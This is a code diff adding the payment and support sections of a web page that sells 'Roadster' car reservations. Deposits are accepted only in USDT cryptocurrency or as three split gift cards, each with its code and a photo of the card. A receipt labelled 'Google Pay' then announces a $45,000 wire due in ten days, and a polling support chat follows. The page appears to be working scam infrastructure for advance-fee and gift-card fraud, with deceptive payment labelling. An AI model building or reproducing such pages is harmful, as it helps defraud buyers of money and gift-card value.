+        <input id="support-image" type="file" accept="image/*" hidden />
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true">
+          <rect x="3" y="3" width="18" height="18" rx="2"></rect>
+          <circle cx="8.5" cy="8.5" r="1.5"></circle>
+          <path d="M21 15l-5-5L5 21"></path>
+        </svg>
+      </label>
+      <input class="gift-input" id="support-message" type="text" autocomplete="off" placeholder="Message support..." aria-label="Message support" style="flex:1;height:38px" />
+      <button id="support-send-btn" type="submit" style="height:38px;padding:0 16px;border:0;background:#FFFFFF;color:#000000;font-family:'Chakra Petch',sans-serif;font-size:12.5px;font-weight:600;letter-spacing:0.04em;text-transform:uppercase;cursor:pointer;flex-shrink:0">Send</button>
+    </form>
+  </dialog>
+
+  <dialog class="receipt-dialog" id="receipt-dialog" aria-labelledby="receipt-title">
+    <h2 class="receipt-title" id="receipt-title">Reservation Confirmed</h2>
+    <p class="receipt-sub" id="receipt-sub">Your Roadster reservation deposit has been received.</p>
+    <div class="receipt-rows">
+      <div class="receipt-row"><span>Reference</span><span id="receipt-ref">RD-849201</span></div>
+      <div class="receipt-row"><span>Edition</span><span id="receipt-edition">Performance</span></div>
+      <div class="receipt-row"><span>Payment Method</span><span id="receipt-method">Google Pay</span></div>
+      <div class="receipt-row"><span>Paid Today</span><span id="receipt-paid">$5,000</span></div>
+      <div class="receipt-row"><span>Wire Due (10 days)</span><span id="receipt-wire">$45,000</span></div>
+    </div>
+    <button class="receipt-close" id="receipt-close" type="button">Done</button>
+  </dialog>
+
+  <script>
+    (function () {
+      const slideLabels = ['Profile', 'Interior', 'Rear', 'Front'];
+      const slides = Array.from(document.querySelectorAll('.slide-img'));
+      const dots = Array.from(document.querySelectorAll('.dot-btn'));
+      const caption = document.getElementById('slide-caption');
+
+      let currentSlide = 0;
+
+      function setSlide(index) {
+        currentSlide = (index + slides.length) % slides.length;
+        slides.forEach((img, i) => img.classList.toggle('is-active', i === currentSlide));
+        dots.forEach((dot, i) => dot.classList.toggle('is-active', i === currentSlide));
+        caption.textContent = 'Roadster · ' + slideLabels[currentSlide];
+      }
+
+      document.getElementById('prev-slide').addEventListener('click', () => setSlide(currentSlide - 1));
+      document.getElementById('next-slide').addEventListener('click', () => setSlide(currentSlide + 1));
+      dots.forEach((dot) => {
+        dot.addEventListener('click', () => setSlide(Number(dot.dataset.slide)));
+      });
+
+      document.addEventListener('keydown', (event) => {
+        if (event.key === 'ArrowLeft') setSlide(currentSlide - 1);
+        if (event.key === 'ArrowRight') setSlide(currentSlide + 1);
+      });
+
+      // Edition selection & pricing summary
+      const tierCards = Array.from(document.querySelectorAll('.tier-card'));
+      const dueEl = document.getElementById('summary-due');
+      const wireEl = document.getElementById('summary-wire');
+      const reserveBtn = document.getElementById('reserve-btn');
+
+      let selectedEdition = { name: 'Performance', due: 5000, wire: 45000 };
+      let giftApplied = false;
+
+      const formatUSD = (amount) => '$' + amount.toLocaleString('en-US');
+
+      tierCards.forEach((card) => {
+        card.addEventListener('click', () => {
+          if (card.disabled) return;
+          tierCards.forEach((item) => {
+            const selected = item === card;
+            item.classList.toggle('is-selected', selected);
+            item.setAttribute('aria-pressed', String(selected));
+          });
+
+          selectedEdition = {
+            name: card.dataset.name,
+            due: Number(card.dataset.due),
+            wire: Number(card.dataset.wire)
+          };
+          dueEl.textContent = formatUSD(selectedEdition.due);
+          wireEl.textContent = formatUSD(selectedEdition.wire);
+          reserveBtn.textContent = 'Reserve ' + selectedEdition.name + ' — ' + formatUSD(selectedEdition.due);
+        });
+      });
+
+      // Payment method tabs (USDT / Gift Card)
+      const paymentTabs = Array.from(document.querySelectorAll('.payment-tab'));
+      const panelUsdt = document.getElementById('panel-usdt');
+      const panelGift = document.getElementById('panel-giftcard');
+
+      paymentTabs.forEach((tab) => {
+        tab.addEventListener('click', () => {
+          const method = tab.dataset.method;
+          paymentTabs.forEach((t) => {
+            const active = t === tab;
+            t.classList.toggle('is-active', active);
+            t.setAttribute('aria-selected', String(active));
+          });
+          panelUsdt.classList.toggle('is-active', method === 'usdt');
+          panelGift.classList.toggle('is-active', method === 'giftcard');
+        });
+      });
+
+      // USDT network selector & copy
+      const usdtNetBtns = Array.from(document.querySelectorAll('.usdt-net-btn'));
+      const usdtAddressEl = document.getElementById('usdt-address');
+      const usdtCopyBtn = document.getElementById('usdt-copy-btn');
+      let activeUsdtNet = 'TRC-20';
+
+      usdtNetBtns.forEach((btn) => {
+        btn.addEventListener('click', () => {
+          activeUsdtNet = btn.dataset.net;
+          usdtNetBtns.forEach((b) => b.classList.toggle('is-active', b === btn));
+          usdtAddressEl.textContent = btn.dataset.addr;
+          usdtCopyBtn.textContent = 'Copy';
+        });
+      });
+
+      usdtCopyBtn.addEventListener('click', () => {
+        if (navigator.clipboard) {
+          navigator.clipboard.writeText(usdtAddressEl.textContent).catch(() => {});
+        }
+        usdtCopyBtn.textContent = 'Copied';
+        setTimeout(() => { usdtCopyBtn.textContent = 'Copy'; }, 1500);
+      });
+
+      // Split Gift Card validation & application ($2,000 + $2,000 + $1,000)
+      const giftSlots = Array.from(document.querySelectorAll('.gift-slot'));
+      const giftStatus = document.getElementById('gift-status');
+      const splitAppliedLabel = document.getElementById('split-applied-label');
+      const splitProgressFill = document.getElementById('split-progress-fill');
+      const appliedSlots = [false, false, false];
+
+      function updateSplitState() {
+        const appliedTotal = giftSlots.reduce((sum, slot, idx) => {
+          return sum + (appliedSlots[idx] ? Number(slot.dataset.amount) : 0);
+        }, 0);
+        const target = selectedEdition.due;
+        const pct = Math.min(100, Math.round((appliedTotal / target) * 100));
+
+        splitAppliedLabel.textContent = formatUSD(appliedTotal) + ' / ' + formatUSD(target);
+        splitProgressFill.style.width = pct + '%';
+
+        giftApplied = appliedTotal >= target;
+        reserveBtn.disabled = !giftApplied;
+
+        if (giftApplied) {
+          giftStatus.textContent = 'All 3 gift cards applied ($2,000 + $2,000 + $1,000). Ready to reserve.';
+          giftStatus.className = 'gift-status is-success';
+        } else {
+          const remaining = target - appliedTotal;
+          giftStatus.textContent = 'Remaining deposit due: ' + formatUSD(remaining) + '.';
+          giftStatus.className = 'gift-status';
+        }
+      }
+
+      giftSlots.forEach((slot, idx) => {
+        const codeInput = slot.querySelector('.gift-code');
+        const fileInput = slot.querySelector('.gift-file');
+        const uploadLabel = slot.querySelector('.gift-upload-label');
+        const fileNameEl = slot.querySelector('.gift-file-name');
+        const thumbImg = slot.querySelector('.gift-thumb');
+
+        function syncSlot() {
+          const code = codeInput.value.trim();
+          const hasImage = Boolean(fileInput.files && fileInput.files.length > 0);
+          const ready = code.length >= 8 && hasImage;
+          appliedSlots[idx] = ready;
+          slot.classList.toggle('is-applied', ready);
+          updateSplitState();
+        }
+
+        codeInput.addEventListener('input', syncSlot);
+
+        fileInput.addEventListener('change', () => {
+          const file = fileInput.files && fileInput.files[0];
+          if (!file) {
+            uploadLabel.classList.remove('has-file');
+            fileNameEl.textContent = 'Upload card image';
+            thumbImg.hidden = true;
+            thumbImg.removeAttribute('src');
+            syncSlot();
+            return;
+          }
+          uploadLabel.classList.add('has-file');
+          fileNameEl.textContent = file.name;
+          const reader = new FileReader();
+          reader.onload = (e) => {
+            thumbImg.src = e.target.result;
+            thumbImg.hidden = false;
+          };
+          reader.readAsDataURL(file);
+          syncSlot();
+        });
+      });
+
+      // Confirmation modal
+      const dialog = document.getElementById('receipt-dialog');
+      function openReceipt(methodLabel, txid) {
+        const ref = 'RD-' + Math.floor(100000 + Math.random() * 900000);
+        document.getElementById('receipt-ref').textContent = ref;
+        document.getElementById('receipt-edition').textContent = selectedEdition.name;
+        document.getElementById('receipt-method').textContent = methodLabel;
+        document.getElementById('receipt-paid').textContent = formatUSD(selectedEdition.due);
+        document.getElementById('receipt-wire').textContent = formatUSD(selectedEdition.wire);
+        if (typeof dialog.showModal === 'function') {
+          dialog.showModal();
+        }
+        fetch('/api/reserve', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            ref,
+            edition: selectedEdition.name,
+            paymentMethod: methodLabel,
+            amount: selectedEdition.due,
+            txid: txid || undefined
+          })
+        }).catch(() => {});
+      }
+
+      document.getElementById('usdt-btn').addEventListener('click', () => {
+        const txid = document.getElementById('usdt-txid').value.trim();
+        openReceipt('USDT (' + activeUsdtNet + ')', txid);
+      });
+
+      reserveBtn.addEventListener('click', () => {
+        if (!giftApplied) return;
+        openReceipt('Gift Card Split ($2,000 + $2,000 + $1,000)');
+      });
+
+      document.getElementById('receipt-close').addEventListener('click', () => {
+        dialog.close();
+      });
+
+      // Support DM chat (two-way messages + images)
+      const supportDialog = document.getElementById('support-dialog');
+      const supportForm = document.getElementById('support-form');
+      const supportSendBtn = document.getElementById('support-send-btn');
+      const supportThread = document.getElementById('support-thread');
+      const supportMsgInput = document.getElementById('support-message');
+      const supportImageInput = document.getElementById('support-image');
+      const supportAttachmentBar = document.getElementById('support-attachment-bar');
+      const supportFileName = document.getElementById('support-file-name');
+      const supportThumb = document.getElementById('support-thumb');
+      const supportClearImg = document.getElementById('support-clear-img');
+
+      let sessionId = localStorage.getItem('roadster_dm_session');
+      if (!sessionId) {
+        sessionId = 'S-' + Math.random().toString(36).slice(2, 6).toUpperCase();
+        localStorage.setItem('roadster_dm_session', sessionId);
+      }
+
+      let supportImageDataUrl = '';
+      let supportPollTimer = null;
+      let renderedSignature = '';
+      const historyKey = 'roadster_dm_history_' + sessionId;
+
+      function renderMessages(messages) {
+        if (!Array.isArray(messages)) return;
+        const sig = messages.map((m) => m.id).join('|');
+        if (sig === renderedSignature) return;
+        renderedSignature = sig;
+        try {
+          localStorage.setItem(historyKey, JSON.stringify(messages));
+        } catch {}
+
+        supportThread.innerHTML = '';
+        messages.forEach((m) => {
+          const isVisitor = m.sender === 'visitor';
+          const bubble = document.createElement('div');
+          bubble.style.cssText = isVisitor
+            ? 'align-self:flex-end;max-width:82%;padding:9px 12px;background:#242428;color:#FFFFFF;font-size:13px;line-height:1.45;display:flex;flex-direction:column;gap:6px'
+            : 'align-self:flex-start;max-width:82%;padding:9px 12px;background:#141416;border:1px solid #242428;border-left:2px solid #26A17B;color:#E5E5EA;font-size:13px;line-height:1.45;display:flex;flex-direction:column;gap:6px';
+          if (m.text) {
+            const p = document.createElement('span');
+            p.textContent = m.text;
+            bubble.appendChild(p);
+          }
+          if (m.imageDataUrl) {
+            const img = document.createElement('img');
+            img.src = m.imageDataUrl;
+            img.style.cssText = 'max-width:180px;max-height:140px;object-fit:cover;border:1px solid #2C2C2E';
+            bubble.appendChild(img);
+          }
+          supportThread.appendChild(bubble);
+        });
+        supportThread.scrollTop = supportThread.scrollHeight;
+      }
+
+      // Restore cached history immediately
+      try {
+        const cached = JSON.parse(localStorage.getItem(historyKey) || 'null');
+        if (Array.isArray(cached) && cached.length) renderMessages(cached);
+      } catch {}
+
+      async function fetchMessages() {
+        try {
+          const res = await fetch('/api/support/messages?session=' + encodeURIComponent(sessionId));
+          if (!res.ok) return;
+          const data = await res.json();
+          renderMessages(data.messages);
+        } catch {}
+      }
+
+      function clearSupportImage() {
+        supportImageDataUrl = '';
+        supportImageInput.value = '';
+        supportAttachmentBar.style.display = 'none';
+        supportThumb.removeAttribute('src');
+        supportFileName.textContent = '';
+      }
+
+      supportImageInput.addEventListener('change', () => {
+        const file = supportImageInput.files && supportImageInput.files[0];
+        if (!file) {
+          clearSupportImage();
+          return;
+        }
+        supportFileName.textContent = file.name;
+        const reader = new FileReader();
+        reader.onload = (e) => {
+          supportImageDataUrl = e.target.result;
+          supportThumb.src = supportImageDataUrl;
+          supportAttachmentBar.style.display = 'flex';
+        };
+        reader.readAsDataURL(file);
+      });
+
+      supportClearImg.addEventListener('click', clearSupportImage);
+
+      document.getElementById('support-open-btn').addEventListener('click', () => {
+        if (typeof supportDialog.showModal === 'function') supportDialog.showModal();
+        fetchMessages();
+        supportPollTimer = setInterval(fetchMessages, 2500);
+        supportMsgInput.focus();
+      });
+
+      function stopSupportPoll() {
+        if (supportPollTimer) {
+          clearInterval(supportPollTimer);
+          supportPollTimer = null;
+        }
+      }
+
+      document.getElementById('support-close-x').addEventListener('click', () => {
+        supportDialog.close();
+        stopSupportPoll();
+      });
+      supportDialog.addEventListener('close', stopSupportPoll);
+
+      supportForm.addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const message = supportMsgInput.value.trim();
+        if (!message && !supportImageDataUrl) return;
+
+        supportSendBtn.disabled = true;
+        try {
+          const res = await fetch('/api/support', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ sessionId, message, imageDataUrl: supportImageDataUrl })
+          });
+          if (!res.ok) throw new Error('Failed to send');
+          const data = await res.json();
+          renderMessages(data.messages);
+          supportMsgInput.value = '';
+          clearSupportImage();
+        } catch {
+          // Silently ignore if server is offline
+        } finally {
+          supportSendBtn.disabled = false;
+          supportMsgInput.focus();
+        }
+      });
+
+      // Record page visit on backend (silently ignored when opened via file://)
+      fetch('/api/visit', { method: 'POST', keepalive: true }).catch(() => {});
+    })();
+  </script>
+</body>
+</html>
